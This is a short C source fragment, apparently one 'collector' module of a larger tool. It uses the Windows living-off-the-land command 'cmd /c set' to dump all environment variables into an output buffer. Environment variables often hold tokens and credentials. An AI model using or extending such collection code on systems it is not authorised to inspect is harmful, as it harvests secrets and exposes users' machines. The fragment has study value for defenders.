// chunk: collectors/env_vars_lolbin
// depends: core/emit_buffer, core/run_cmd
// provides: collect_env_vars
// note: LOLBin env vars via cmd /c set

#ifndef CHUNK_ENV_VARS_LOLBIN
#define CHUNK_ENV_VARS_LOLBIN

static void collect_env_vars(void) {
    emitf("=== ENVIRONMENT VARS ===\r\n");
    char buf[8192] = {0};
    DWORD buf_len = 0;
    run_cmd("cmd /c set", buf, sizeof(buf), &buf_len);
    if (buf_len > 0) emitf("%.*s", (int)buf_len, buf);
    emitf("\r\n");
}

#endif
